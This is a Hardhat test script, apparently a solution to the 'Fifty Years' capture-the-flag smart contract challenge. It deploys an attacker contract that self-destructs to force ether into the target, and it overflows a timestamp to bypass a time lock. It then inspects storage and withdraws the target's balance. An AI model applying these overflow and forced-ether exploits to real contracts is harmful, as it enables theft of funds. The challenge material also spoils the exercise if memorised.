import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers"
import {
    FiftyYearsChallenge,
    RetirementAttacker__factory,
    RetirementAttacker,
} from "../typechain-types"
import { assert, expect } from "chai"
import { ethers, network } from "hardhat"
import { BigNumber, providers, Signer, Wallet } from "ethers"
import "dotenv/config"

describe("Fifty Years challenge", function () {
    let attacker: Wallet
    let target: FiftyYearsChallenge
    before(async function () {
        // Setup code here
        let instanceAddress: string =
            "0x23304839732C775B7b1F2877735620Bb0cE70A3F"
        attacker = new Wallet(
            process.env.METAMASK_PRIVATE_KEY!,
            ethers.provider
        )
        target = await ethers.getContractAt(
            "FiftyYearsChallenge",
            instanceAddress,
            attacker
        )
    })

    it("Attacking contract", async function () {
        // Exploit code here
        let tx, blockInitNum, blockFinNum
        const attackerFactory: RetirementAttacker__factory =
            await ethers.getContractFactory("RetirementAttacker")
        const attackerContract: RetirementAttacker = await (
            await attackerFactory.deploy(target.address, { value: 2 })
        ).connect(attacker)
        console.log(`Attacker deployed at: ${attackerContract.address}`)

        const tstamp = ethers.constants.MaxUint256.sub(24 * 60 * 60).add(1)
        console.log(`tstamp: ${tstamp}`)

        tx = await target.upsert(1, tstamp, { value: 1 })
        await tx.wait(1)

        tx = await target.upsert(2, 0, { value: 2 })
        await tx.wait(1)

        const firstSlotAddress = ethers.utils.keccak256(
            ethers.utils.hexZeroPad(ethers.utils.hexlify(0), 32)
        )
        for (let i = 0; i < 6; i++) {
            console.log(
                `Array Slot ${i}: ${await ethers.provider.getStorageAt(
                    target.address,
                    ethers.BigNumber.from(firstSlotAddress).add(i)
                )}`
            )
        }
        console.log(
            `Slot 0: ${await ethers.provider.getStorageAt(target.address, 0)}`
        )
        console.log(
            `Slot 1: ${await ethers.provider.getStorageAt(target.address, 1)}`
        )

        tx = await attackerContract.kill()
        await tx.wait(1)

        console.log(
            `Contract balance: ${await ethers.provider.getBalance(
                target.address
            )}`
        )

        tx = await target.withdraw(2)
        await tx.wait(1)
    })

    after(async function () {
        // Verification Code here
        assert(await target.isComplete(), "Challenge not completed")
    })
})
